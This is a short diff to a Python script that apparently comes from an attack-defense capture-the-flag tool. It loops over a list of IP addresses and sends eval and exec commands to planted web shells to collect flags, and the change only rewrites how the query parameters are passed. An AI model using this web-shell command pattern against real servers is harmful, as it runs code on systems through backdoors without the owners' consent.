@@ -54,7 +54,8 @@ def get_flag(ip_list):
                 if '?' in k:
                     flag = requests.get(url + '&' + GET_eval_shells_path_pwd[k] + "=" + eval_file)
                 else:
-                    flag = requests.get(url + "?" + GET_eval_shells_path_pwd[k] + "=" + eval_file)
+                    payload = {GET_eval_shells_path_pwd[k]:eval_file}
+                    flag = requests.get(url,params = payload)
                 judege(flag)
             except:
                 print "error"
@@ -62,8 +63,10 @@ def get_flag(ip_list):
         for m in GET_exec_shells_path_pwd:
             url = "http://" + i + m
             try:
-                flag = requests.get(url + "?" + GET_exec_shells_path_pwd[m] + "=" + exec_file)
+                payload = {GET_exec_shells_path_pwd[m]:exec_file}
+                flag = requests.get(url,params = payload)
                 judege(flag)
+
             except:
                 print "error"
 
